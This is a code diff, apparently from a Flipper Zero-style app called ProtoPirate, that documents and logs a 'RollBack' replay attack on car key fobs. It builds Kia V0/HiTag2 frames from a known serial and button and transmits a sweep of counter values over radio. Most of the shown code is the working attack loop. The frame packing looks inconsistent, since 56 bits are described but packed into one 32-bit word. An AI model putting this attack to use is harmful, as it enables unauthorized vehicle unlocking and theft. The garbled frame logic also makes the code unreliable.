@@ -1,5 +1,8 @@
 #include "protopirate_rb.h"
 
+// ===================== RollBack 攻击引擎 =====================
+// 基于已知序列号+按钮，枚举计数器进行重放攻击
+
 void rollback_build_frame(
     uint32_t serial,
     uint8_t button,
@@ -7,12 +10,15 @@ void rollback_build_frame(
     uint32_t* data_hi,
     uint32_t* data_lo) {
 
+    // Kia V0/HiTag2 frame construction:
+    // [28-bit serial << 12] | [4-bit button << 8] | [16-bit counter] | [CRC-8]
     uint32_t frame_serial = (serial & 0x0FFFFFFF) << 12;
     uint16_t frame_btn = (button & 0x0F) << 8;
     uint16_t frame_cnt = counter;
 
     uint32_t prelim_lo = frame_serial | frame_btn | frame_cnt;
 
+    // Calculate CRC over 6 bytes (3 from hi, 3 from lo)
     uint8_t crc_bytes[6] = {0};
     crc_bytes[0] = 0;
     crc_bytes[1] = 0;
@@ -24,6 +30,10 @@ void rollback_build_frame(
 
     *data_hi = 0;
     *data_lo = frame_serial | frame_btn | frame_cnt | crc;
+
+    FURI_LOG_I(
+        TAG, "RollBack frame: serial=0x%07lX btn=0x%X cnt=0x%04X crc=0x%02X -> 0x%08lX%08lX",
+        serial, button, counter, crc, *data_hi, *data_lo);
 }
 
 bool rollback_send_single(
@@ -50,6 +60,11 @@ bool rollback_attack_run(ProtoPirateApp* app) {
     uint32_t total_steps = abs((int32_t)end - (int32_t)start) / step + 1;
     uint32_t current_step = 0;
 
+    FURI_LOG_I(
+        TAG, "RollBack START: cnt 0x%04X -> 0x%04X, step=%u, total=%lu",
+        start, end, step, total_steps);
+
+    // Initialize TX hardware for the attack
     if(!tx_init_hw(app, app->frequency)) {
         rs->running = false;
         return false;
@@ -57,21 +72,28 @@ bool rollback_attack_run(ProtoPirateApp* app) {
 
     transmit_start(app, app->frequency);
 
+    // Emit counter values from start to end
     for(uint16_t cnt = start;; cnt += direction * step) {
         uint32_t data_hi, data_lo;
         rollback_build_frame(rs->serial, rs->button, cnt, &data_hi, &data_lo);
+
         transmit_burst(app, data_hi, data_lo);
         furi_delay_ms(30);
+
         rs->current_counter = cnt;
         current_step++;
+
+        // Check termination
         if((direction > 0 && cnt >= end) ||
            (direction < 0 && cnt <= end)) {
             break;
         }
-        if(current_step > 65536) break;
+        if(current_step > 65536) break; // Safety limit
     }
 
     transmit_stop(app);
     rs->running = false;
+
+    FURI_LOG_I(TAG, "RollBack DONE: %lu frames sent", current_step);
     return true;
 }
